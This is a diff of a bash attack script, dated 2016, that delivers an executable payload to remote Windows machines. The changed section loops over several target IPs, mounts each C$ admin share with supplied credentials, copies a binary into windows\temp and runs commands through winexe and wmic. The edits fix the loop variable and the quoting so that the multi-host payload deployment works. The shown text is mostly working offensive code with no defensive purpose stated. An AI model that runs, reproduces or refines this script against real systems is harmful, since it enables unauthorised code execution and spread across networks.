@@ -3,8 +3,8 @@
 #################################################
 # Created by @jgaudard  :: I don't twitter much 
 # Used wmic to execute an exe payload.
-# Created: 18 June 2016    Edited: 
-# Version 1.0
+# Created: 18 June 2016    Edited: 22 June 2016
+# Version 2.0
 #################################################
 
 clear
@@ -48,10 +48,8 @@ elif [ $menu == 2 ]; then
 	read -p "Username: " username
 	read -p "Password: " password
 
-	for ip in multiip ; do
-        	echo mounting...
-		mount.cifs //$ip/C$ /mnt/targetdrive -o user=$username,password=$password
-		echo copying $lpath/$binary
+	for ip in $multiip ; do
+		mount.cifs //$ip/C$ /mnt/targetdrive -o user="$username",password="$password"
         	cp $lpath/$binary /mnt/targetdrive/windows/temp
        		winexe -U "$username%$password" //$ip ipconfig
         	winexe -U "$username%$password" //$ip "wmic os list brief"
